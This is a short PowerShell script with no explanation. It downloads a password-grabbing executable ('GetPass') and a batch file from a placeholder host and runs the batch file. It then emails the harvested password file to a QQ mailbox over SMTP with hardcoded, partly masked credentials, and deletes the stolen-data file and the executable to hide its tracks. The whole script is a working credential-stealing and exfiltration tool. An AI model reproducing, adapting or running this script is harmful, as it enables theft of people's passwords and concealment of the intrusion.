(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/GetPass.rar','D:\Get.exe');

(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/Command.rar','D:\Command.bat');

D:\Command.bat;
$SMTPServer = 'smtp.qq.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxxxx@qq.com', 'olawgxxxxxxx');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = 'xxxxx@qq.com'

$ReportEmail.To.Add('xxxxx@qq.com')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  

$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\GetPass.txt'

remove-item 'D:\Get.exe'
